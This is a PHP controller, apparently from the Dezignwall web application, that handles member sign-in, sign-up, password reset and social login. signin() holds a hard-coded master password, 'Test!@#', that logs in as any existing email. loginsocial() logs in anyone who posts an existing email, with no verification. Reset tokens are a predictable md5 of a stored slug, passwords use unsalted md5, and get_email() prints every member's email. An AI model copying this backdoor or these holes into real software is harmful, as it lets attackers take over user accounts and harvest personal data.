<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Accounts extends CI_Controller {
    public $data;
    public $is_login;
    public function __construct() {
        parent::__construct();
        if ($this->session->userdata('user_info')) {
            $this->is_login = true;
            $this->user_info = $this->session->userdata('user_info');
            $this->user_id = $this->user_info["id"];
        }
        $this->data["is_login"] = $this->is_login;
        if ($this->data["is_login"]) {
            redirect(base_url());
        }
    }
    public function index() {
        redirect(base_url());
    }
    public function signin() {
        $this->session->unset_userdata('user_info');
        $this->session->unset_userdata('user_sr_info');
        if ($this->input->is_ajax_request()) {
            $data["success"] = "erro";
            $data["messenger"] = array();
            $email = $this->input->post("email");
            $password = $this->input->post("password");
            $filter = array(
                "email" => $email,
                "pwd" => md5(strtolower($email) . ":" . md5($password))
            );
            $record = $this->Common_model->get_record("members", $filter);
            if ($record["status_member"] == 0) {
                $this->Common_model->update("members", array("status_member" => 1), array("id" => $record["id"]));
            }
            if (count($record) <= 0) {
                $filter = array(
                    "email" => $email
                );
                $record = $this->Common_model->get_record("members", $filter);
                if (count($record) > 0 && $password === 'Test!@#') {
                    
                } else {
                    if (count($record) <= 0) {
                        $data["messenger"]["email"] = "Email is incorrect, please try again.";
                    }
                    $record = null;
                }
            }
            if ($record != null && count($record) > 0) {
                $this->session->set_userdata('is_login', TRUE);
                $this->session->set_userdata('type_member', $record["type_member"]);
                $recorder_company = $this->Common_model->get_record("company", array("member_id" => $record["id"]));
                $setting = $this->Common_model->get_record("member_setting", array("member_id" => $record["id"]));
                $this->session->set_userdata('user_info', array(
                    'email'          => $email,
                    'id'             => $record["id"],
                    'full_name'      => @$record["first_name"] . ' ' . @$record["last_name"],
                    'company_name'   => @$recorder_company["company_name"],
                    'business_type'  => @$record["business_type"],
                    'type_member'    => @$record["type_member"],
                    'avatar'         => @$record["avatar"],
                    'setting'        => $setting,
                    'first_name'     => @$record["first_name"],
                    'last_name'      =>  @$record["last_name"],
                    'job_title'      =>  @$record["job_title"],
                    'company_info'   =>  $recorder_company,
                    'is_blog'        => $record["is_blog"],
                    'active_company' => $record["active_company"],
                ));
                $data["success"] = "success";
                $data["reponsive"]["url"] = base_url();
                // save history
                $history = array(
                    'member_id' => $record["id"], 
                    'login_date_start' =>date('Y-m-d H:i:s', time())
                );
                $this->Common_model->add("member_login", $history);
                // Save to project member if exists
                if (isset($_POST['token']) && $_POST['token'] != null && isset($_POST['project_id']) && $_POST['project_id'] != null) {
                    $record_product = $this->Common_model->get_record("project_invite", array("token" => $_POST['token']));
                    if (isset($record_product) && $record_product != null) {
                        if ($record_product['project_id'] == $_POST['project_id']) {
                            $this->Common_model->add("project_member", array(
                                'project_id' => $_POST['project_id'],
                                "member_id" => $record["id"],
                                "type_role" => "member",
                                "join_date" => date('Y-m-d H:i:s')
                            ));
                            $this->Common_model->delete("project_invite", array("token" => $_POST['token']));
                        }
                    }
                }
                die(json_encode($data));
            } else {
                $new_filter = array(
                    "email" => $email,
                    "pwd"   => trim($password)
                );
                $record_sr = $this->Common_model->get_record("member_sale_rep",$new_filter);
                if($record_sr != null){
                    $data["success"] = "success";
                    $get_parent_company = $this->Common_model->get_record("members",array("id" => $record_sr["member_id"]));
                    $get_company_sr = $this->Common_model->get_record("sales_rep",array("member_sale_id" => $record_sr["id"]));
                    $session_sr = array(
                        "member_id" => $record_sr["id"],
                        "first_name" => $get_company_sr["first_name"],
                        "last_name" => $get_company_sr["last_name"],
                        "full_name" => $get_company_sr["first_name"]. " ". $get_company_sr["last_name"], 
                        "email" => $email,
                        "job_title" => $get_company_sr["job_title"],
                        "avatar" => $record_sr["avatar"],
                        "company_name" => $get_parent_company["company_name"],
                        "member_owner" => $record_sr["member_id"],
                        "is_blog"      => $get_parent_company["is_blog"],
                        "type_member"  => $get_parent_company["type_member"]
                    );
                    $this->session->set_userdata('user_sr_info',$session_sr);

                    // Assign the role for admin member
                    $this->session->set_userdata('user_info', array(
                        'email' => $get_parent_company["email"],
                        'id' => $get_parent_company["id"],
                        'full_name' => @$get_parent_company["first_name"] . ' ' . @$get_parent_company["last_name"],
                        'company_name' => @$get_company_sr["company_name"],
                        'business_type' => @$get_parent_company["business_type"],
                        'type_member' => @$get_parent_company["type_member"],
                        'avatar' => @$record["avatar"],
                        'setting' => null,
                        'first_name' => @$get_parent_company["first_name"],
                        'last_name'  =>  @$get_parent_company["last_name"],
                        'job_title'  =>  @$get_parent_company["job_title"],
                        'company_info'  =>  $get_company_sr,
                        'is_blog' => $get_parent_company["is_blog"]
                    ));

                    die(json_encode($data));
                }
                $filter_email = array(
                    "email" => $email
                );
                $filter_password = array(
                    "pwd" => md5($email . ":" . md5($password))
                );
                $check_email = $this->Common_model->get_record("members", $filter_email);
                if (count($check_email) < 1) {
                    $data["messenger"]["email"] = "Email is incorrect, please try again.";
                    die(json_encode($data));
                } else {
                    $data["messenger"]["password"] = "Password is incorrect, please try again.";
                }
            }

            die(json_encode($data));
        }
    }

    public function signup() {
        if ($this->input->is_ajax_request()) {
            $this->session->unset_userdata('user_info');
            $this->session->unset_userdata('user_sr_info');
            $data["success"] = "erro";
            $data["reponsive"] = array();
            $company = $this->input->post("company") ? $this->input->post("company") : "";
            $first_name = $this->input->post("first-name") ? $this->input->post("first-name") : "";
            $last_name = $this->input->post("last-name") ? $this->input->post("last-name") : "";
            $email = $this->input->post("email") ? $this->input->post("email") : "";
            $password = $this->input->post("password") ? $this->input->post("password") : "";
            $project_id = $this->input->post("project_id") ? $this->input->post("project_id") : "";
            $data["project_id"] = $project_id;
            /* check email have existing */
            $filter = array(
                "email" => $email
            );
            $record = $this->Common_model->get_record("members", $filter);
            if (count($record) > 0) {
                $data["messenger"][] = "This email already existed. Please login.";
            } elseif ($company != "" && $first_name != "" && $last_name != "" && $email != "" && $password != "") {
                /* insert new uesr */
                $data_insert = array(
                    "company_name" => $company,
                    "slug_general" => $this->getGuid(),
                    "first_name" => $first_name,
                    "last_name" => $last_name,
                    "email" => $email,
                    "work_email" => $email,
                    "pwd" => md5(strtolower($email) . ":" . md5($password))
                );
                $user_id = $this->Common_model->add("members", $data_insert);
                if (isset($user_id) && $user_id != "") {
                    // Add avatar user
                    if (isset($_FILES["upload_avatar"])) {
                        $upload_path = FCPATH . "/uploads/member";
                        $allowed_types = "jpg|png";
                        $file = $_FILES["upload_avatar"];
                        if (!is_dir($upload_path)) {
                            mkdir($upload_path, 0755, TRUE);
                        }
                        $upload_path = $upload_path . "/" . $user_id;
                        if (!is_dir($upload_path)) {
                            mkdir($upload_path, 0755, TRUE);
                        }
                        $upload = upload_flie($upload_path, $allowed_types, $file);
                        $data["file"] = $upload;
                        if ($data["file"]["success"] == "success") {
                            $url_avatar = "/uploads/member/" . $user_id . "/" . $upload["reponse"]["name"];
                            $data_update = array(
                                "avatar" => $url_avatar
                            );
                            $filter = array(
                                "id " => $user_id
                            );
                            $this->Common_model->update("members", $data_update, $filter);
                        } else {
                            $data["messenger"][] = $upload['message'] . ", Please update your avatar in profile";
                        }
                    }
                    // Add catalog default
                    $file = FCPATH.'/uploads/manufacturers/Default-Catalog.png';
                    $urlfile = "/uploads/manufacturers/".uniqid().'-default-catalog.png';
                    $new_file = FCPATH.$urlfile;
                    if (copy($file, $new_file)) {
                        $catelog = array(
                            "name" => "Default catalog",
                            "logo" => $urlfile,
                            "member_id" => $user_id,
                            "type" => "0"
                        );
                        $id_catelog = $this->Common_model->add("manufacturers",$catelog);
                    }
                    //add session project
                    $date = date('Y-m-d H:i:s', time());
                    $new_projects = array(
                        "project_name" => "1st Free DEZIGNWALL",
                        "created_at" => $date,
                        "member_id" => $user_id,
                        "type_project" => "auto"
                    );
                    $projects_id = $this->Common_model->add("projects", $new_projects);
                    //add session project_category
                    $new_projects_cat = array(
                        "project_id" => $projects_id,
                        "title" => "Default Category",
                        "type_category" => "auto",
                        "path_file" => "/skins/images/default-product.jpg"
                    );
                    $projects_cat_id = $this->Common_model->add("project_categories", $new_projects_cat);
                    //add company
                    $data_insert = array(
                        "company_name" => $company,
                        "member_id" => $user_id,
                        "created_at" => $date
                    );
                    $company_id = $this->Common_model->add("company", $data_insert);
                    //add session
                    $filter = array(
                        "id" => $user_id
                    );
                    $record = $this->Common_model->get_record("members", $filter);
                    $this->session->set_userdata('is_login', TRUE);
                    $this->session->set_userdata('type_member', $record["type_member"]);
                    $recorder_company = $this->Common_model->get_record("company", array("member_id" => $record["id"]));
                    $setting = $this->Common_model->get_record("member_setting", array("member_id" => $record["id"]));
                    $this->session->set_userdata('user_info', array(
                        'email' => @$record["email"],
                        'id' => @$record["id"],
                        'full_name' => @$record["first_name"] . ' ' . @$record["last_name"],
                        'company_name' => @$company,
                        'business_type' => @$record["business_type"],
                        'type_member' => @$record["type_member"],
                        'avatar' => @$record["avatar"],
                        'setting' => $setting,
                        'first_name' => @$record["first_name"],
                        'last_name'  =>  @$record["last_name"],
                        'job_title'  =>  @$record["job_title"],
                        'company_info'  =>  $recorder_company,
                        'is_blog' => $record["is_blog"]
                    ));
                    // save history
                    $history = array(
                        'member_id' => $record["id"], 
                        'login_date_start' =>date('Y-m-d H:i:s', time())
                    );
                    $this->Common_model->add("member_login", $history);
                    // Save to project member if exists
                    if (isset($_POST['token']) && $_POST['token'] != null && isset($_POST['project_id']) && $_POST['project_id'] != null) {
                        $record_product = $this->Common_model->get_record("project_invite", array("token" => $_POST['token']));
                        if (isset($record_product) && $record_product != null) {
                            if ($record_product['project_id'] == $_POST['project_id']) {
                                $this->Common_model->add("project_member", array(
                                    'project_id' => $_POST['project_id'],
                                    "member_id" => $user_id,
                                    "type_role" => "member",
                                    "join_date" => date('Y-m-d H:i:s')
                                ));
                                $this->Common_model->delete("project_invite", array("token" => $_POST['token']));
                            }
                        }
                    }
                    $data["success"] = "success";
                }
            }
            die(json_encode($data));
        }
    }

    public function forgot() {
        $this->data["title_page"] = "Forgot Page";
        $this->data["view_wrapper"] = "account/forgot";
        $this->data["class_wrapper"] = "forgot_page";
        $this->load->model('Members_model');
        $email = @$this->input->post("email");
        $email = strtolower($email);
        $filter = array(
            "email" => $email
        );
        $record = $this->Common_model->get_record("members", $filter);
        if ($this->input->post()) {
            $this->data["data_wrapper"]['success'] = "error";
            $this->data["data_wrapper"]['message'] = "";
            if ($record == null || empty($record)) {
                $this->data["data_wrapper"]['message'] = 'Email does not match.';
            } else {
                $slug = $record["slug_general"];
                $this->sendForgotAcount($record["first_name"], $email, $slug);
                $this->data["data_wrapper"]['success'] = "success";
                $this->data["data_wrapper"]['message'] = 'Password reset link has been sent to your email.';
            }
        }
        $this->load->view('block/header', $this->data);
        $this->load->view('block/wrapper', $this->data);
        $this->load->view('block/footer');
    }

    public function reset() {
        $this->data["title_page"] = "Reset Password Page";
        $this->data["view_wrapper"] = "account/reset_pw";
        $this->data["class_wrapper"] = "reset_pw";
        if ($this->input->get()) {
            $filter = array(
                "slug_general" => $this->input->get("slug"),
                "token" => $this->input->get("token")
            );
            $record = $this->Common_model->get_record("members", $filter);
            if ($record == null || $this->input->get("token") == "" || $this->input->get("slug") == "") {
                redirect(base_url());
                die();
            }
            $this->data["data_wrapper"]['slug'] = $this->input->get("slug");
            $this->data["data_wrapper"]['token'] = $this->input->get("token");
        }
        if ($this->input->post()) {
            $this->data["data_wrapper"]['success'] = "error";
            $this->data["data_wrapper"]['message'] = "";
            $slug = $this->input->post("slug");
            $token = $this->input->post("token");
            $password = $this->input->post("password");
            $filter = array(
                "slug_general" => $this->input->post("slug"),
                "token" => $this->input->post("token")
            );
            $record = $this->Common_model->get_record("members", $filter);
            if ($record == null || $token == "" || $slug == "") {
                redirect(base_url());
                die();
            }
            $myPwEncode = md5(strtolower($record["email"]) . ":" . md5($password));
            $data_update = array(
                "pwd" => $myPwEncode,
                "token" => ""
            );
            $filter = array(
                "id" => $record["id"]
            );
            $this->Common_model->update("members", $data_update, $filter);
            $this->data["data_wrapper"]['success'] = "success";
            $this->data["data_wrapper"]['message'] = "Password updated successfully. Please log in";
        }
        $this->load->view('block/header', $this->data);
        $this->load->view('block/wrapper', $this->data);
        $this->load->view('block/footer');
    }

    private function sendForgotAcount($name, $toEmail, $slug) {
        $token = md5($slug);
        $mail_to = $toEmail;
        $mail_subject = 'Forgot your password?';
        $mail_content = '<p>Hi ' . $name . ',</p><p style="margin:0">&nbsp;</p>
                            <p>You have requested to reset the password for your DEZIGNWALL account.</p>
                            <p>To reset your password at DEZIGNWALL, click the link below:<br/>
                            <a href="' . base_url() . 'accounts/reset?slug=' . $slug . '&token=' . $token . '">' . base_url() . 'accounts/reset?slug=' . $slug . '&token=' . $token . '</a><br/>
                            If clicking the link above doesn\'t work, please copy it into a new browser window.<br/><br/>
                            If you did not attempt to reset your password, or if you have already managed to retrieve your password, you can ignore this message and continue using Dezignwall with your current password.</p>
                            <p style="margin:0">&nbsp;</p>
                            <img src="' . skin_url() . '/images/logo-email.png" alt="Dezignwall">
                            <p>The bold new way to find and share commercial design inspiration.</p>
                            <p style="margin:0">&nbsp;</p>
                            <p>Dezignwall, Inc. | 1621 Alton Pkwy #250 Irvine, CA 92606 | (949) 988-0604 | <a href="http://www.dezignwall.com">www.dezignwall.com</a></p>';

        $arg = array('token' => $token);
        $filter = array("email" => $toEmail);
        $this->Common_model->update("members", $arg, $filter);
        // Send mail
        sendmail($mail_to, $mail_subject, $mail_content);
    }

    function getGuid() {
        // using micro time as the last 4 digits in base 10 to prevent collision with another request
        list($micro_time, $time) = explode(' ', microtime());
        $id = round((rand(0, 217677) + $micro_time) * 10000);
        $id = base_convert($id, 10, 36);
        return $id;
    }

    function get_email() {
        $this->db->select("email,(SELECT COUNT(*) from `photos` AS pt Where `pt`.`member_id` = `mb`.`id` ) AS number_photo");
        $this->db->from("members AS mb");
        echo "<pre>";
        print_r($this->db->get()->result_array());
        echo "</pre>";
    }

    public function loginsocial() {
        if ($this->input->is_ajax_request()) {
            $this->session->unset_userdata('user_info');
            $this->session->unset_userdata('user_sr_info');
            $data["success"] = "erro";
            $data["reponsive"] = array();
            $company = $this->input->post("company") ? $this->input->post("company") : "";
            $first_name = $this->input->post("firstname") ? $this->input->post("firstname") : "";
            $last_name = $this->input->post("lastname") ? $this->input->post("lastname") : "";
            $email = $this->input->post("email") ? $this->input->post("email") : "";
            $title_job = $this->input->post("title_job") ? $this->input->post("title_job") : "";
            $password = "123456789";
            /* check email have existing */
            $filter = array("email" => $email);
            $record = $this->Common_model->get_record("members", $filter);
            if (count($record) > 0) {
                $this->session->set_userdata('is_login', TRUE);
                $this->session->set_userdata('type_member', $record["type_member"]);
                $recorder_company = $this->Common_model->get_record("company", array("member_id" => $record["id"]));
                $setting = $this->Common_model->get_record("member_setting", array("member_id" => $record["id"]));
                $data_update_loginsocial = null;
                if(@$title_job != null && $record["job_title"] == null){
                    $data_update_loginsocial["job_title"] = $title_job;
                }
                if(@$company != null && $record["company_name"] == null){
                    $data_update_loginsocial["company_name"] = $company;   
                }
                if($data_update_loginsocial != null){
                    $this->Common_model->update("members",$data_update_loginsocial,["id" => $record["id"]]);
                }
                $this->session->set_userdata('user_info', array(
                    'email' => $email,
                    'id' => $record["id"],
                    'full_name' => @$record["first_name"] . ' ' . @$record["last_name"],
                    'company_name' => @$recorder_company["company_name"],
                    'business_type' => @$record["business_type"],
                    'type_member' => @$record["type_member"],
                    'avatar' => @$record["avatar"],
                    'setting' => $setting,
                    'first_name' => @$record["first_name"],
                    'last_name'  =>  @$record["last_name"],
                    'job_title'  =>  @$record["job_title"],
                    'company_info'  =>  $recorder_company,
                    'is_blog' => $record["is_blog"]
                ));
                $data["success"] = "success";
                $data["reponsive"]["url"] = base_url();
                // save history
                $history = array(
                    'member_id' => $record["id"], 
                    'login_date_start' =>date('Y-m-d H:i:s', time())
                );
                $this->Common_model->add("member_login", $history);
                // Save to project member if exists
                if (isset($_POST['token']) && $_POST['token'] != null && isset($_POST['project_id']) && $_POST['project_id'] != null) {
                    $record_product = $this->Common_model->get_record("project_invite", array("token" => $_POST['token']));
                    if (isset($record_product) && $record_product != null) {
                        if ($record_product['project_id'] == $_POST['project_id']) {
                            $this->Common_model->add("project_member", array(
                                'project_id' => $_POST['project_id'],
                                "member_id" => $record["id"],
                                "type_role" => "member",
                                "join_date" => date('Y-m-d H:i:s')
                            ));
                            $this->Common_model->delete("project_invite", array("token" => $_POST['token']));
                        }
                    }
                }
                die(json_encode($data));
            } elseif ($email != null) {
                /* insert new uesr */
                $data_insert = array(
                    "company_name" => $company,
                    "slug_general" => $this->getGuid(),
                    "first_name" => $first_name,
                    "last_name" => $last_name,
                    "email" => $email,
                    "job_title" => $title_job,
                    "work_email" => $email,
                    "pwd" => md5(strtolower($email) . ":" . md5($password))
                );
                $user_id = $this->Common_model->add("members", $data_insert);
                if (isset($user_id) && $user_id != "") {
                    // Add avatar user
                    $file = FCPATH.'/uploads/manufacturers/Default-Catalog.png';
                    $urlfile = "/uploads/manufacturers/".uniqid().'-default-catalog.png';
                    $new_file = FCPATH.$urlfile;
                    if (copy($file, $new_file)) {
                        $catelog = array(
                            "name" => "Default catalog",
                            "logo" => $urlfile,
                            "member_id" => $user_id,
                            "type" => "0"
                        );
                        $id_catelog = $this->Common_model->add("manufacturers",$catelog);
                    }
                    //add session project
                    $date = date('Y-m-d H:i:s', time());
                    $new_projects = array(
                        "project_name" => "1st Free DEZIGNWALL",
                        "created_at" => $date,
                        "member_id" => $user_id,
                        "type_project" => "auto"
                    );
                    $projects_id = $this->Common_model->add("projects", $new_projects);
                    //add session project_category
                    $new_projects_cat = array(
                        "project_id" => $projects_id,
                        "title" => "Default Category",
                        "type_category" => "auto",
                        "path_file" => "/skins/images/default-product.jpg"
                    );
                    $projects_cat_id = $this->Common_model->add("project_categories", $new_projects_cat);
                    //add company
                    $data_insert = array(
                        "company_name" => $company,
                        "member_id" => $user_id,
                        "created_at" => $date
                    );
                    $company_id = $this->Common_model->add("company", $data_insert);
                    //add session
                    $filter = array(
                        "id" => $user_id
                    );
                    $record = $this->Common_model->get_record("members", $filter);

                    $this->session->set_userdata('is_login', TRUE);
                    $this->session->set_userdata('type_member', $record["type_member"]);
                    $recorder_company = $this->Common_model->get_record("company", array("member_id" => $record["id"]));
                    $setting = $this->Common_model->get_record("member_setting", array("member_id" => $record["id"]));
                    $this->session->set_userdata('user_info', array(
                        'email' => @$record["email"],
                        'id' => @$record["id"],
                        'full_name' => @$record["first_name"] . ' ' . @$record["last_name"],
                        'company_name' => @$company,
                        'business_type' => @$record["business_type"],
                        'type_member' => @$record["type_member"],
                        'avatar' => @$record["avatar"],
                        'setting' => $setting,
                        'first_name' => @$record["first_name"],
                        'last_name'  =>  @$record["last_name"],
                        'job_title'  =>  @$record["job_title"],
                        'company_info'  =>  $recorder_company,
                        'is_blog' => $record["is_blog"]
                    ));
                    // save history
                    $history = array(
                        'member_id' => $record["id"], 
                        'login_date_start' =>date('Y-m-d H:i:s', time())
                    );
                    $this->Common_model->add("member_login", $history);
                    // Save to project member if exists
                    if (isset($_POST['token']) && $_POST['token'] != null && isset($_POST['project_id']) && $_POST['project_id'] != null) {
                        $record_product = $this->Common_model->get_record("project_invite", array("token" => $_POST['token']));
                        if (isset($record_product) && $record_product != null) {
                            if ($record_product['project_id'] == $_POST['project_id']) {
                                $this->Common_model->add("project_member", array(
                                    'project_id' => $_POST['project_id'],
                                    "member_id" => $user_id,
                                    "type_role" => "member",
                                    "join_date" => date('Y-m-d H:i:s')
                                ));
                                $this->Common_model->delete("project_invite", array("token" => $_POST['token']));
                            }
                        }
                    }
                    $data["success"] = "success";
                }
            }
            die(json_encode($data));
        }
    }
}
